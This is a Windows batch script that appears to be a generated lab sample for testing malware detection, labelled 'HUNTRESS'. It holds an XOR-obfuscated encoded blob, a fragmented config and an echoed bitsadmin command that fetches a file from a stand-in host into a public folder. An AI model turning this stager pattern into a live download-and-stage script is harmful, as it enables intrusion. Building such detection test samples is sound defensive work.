@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|reverse_xor
rem HUNTRESS-MATERIAL:R1JXHVcBA1JVAQoKAVEeVlRSR0BvUVJ/QEBWQUddRntvUFpfUUZjb0BBVkBmbwlwDltHUkNsVl9aVU9HUlcdUlcGVgtQBVEcV1pfUkVdWh1WX0NeUktWHVcBA1JVAQoKAVEcHAlAQ0dHWw5fQUZPVwEDUlUBCgoBUR5dVFpSQ15SUA5XWmxdVFpSQ15SUE9WXVxdDlZUUkZUXVJfbEdLVl1PVl9UXVpADltDUkFUTwIOR11GXFBsVlRSR0BPVktWHV1aXldSQEdaUQ5BVkdDUldST1ZfWlVsVkdaQUQfVkdcXlZBbFZBWkZCUFIOQENWR0BPAg5F
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,write_file|adapter=bitsadmin.exe|stag"& rem HUNTRESS quote compound
set "h1=e_count=1|graph=single|next_language=none|campaign_id=campaign"& rem HUNTRESS quote compound
set "h2=-b2992fa02d|url=https://b2992fa02d.example.invalid/b6c8e5da.da"& rem HUNTRESS quote compound
set "h3=t|file_path=C:\Users\Public\HuntressLab\stage-b2992fa02d.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=4920a20c"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "cfg=%h0%%h1%%h2%%h3%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://b2992fa02d.example.invalid/b6c8e5da.dat to C:\Users\Public\HuntressLab\stage-b2992fa02d.dat
exit /b 0
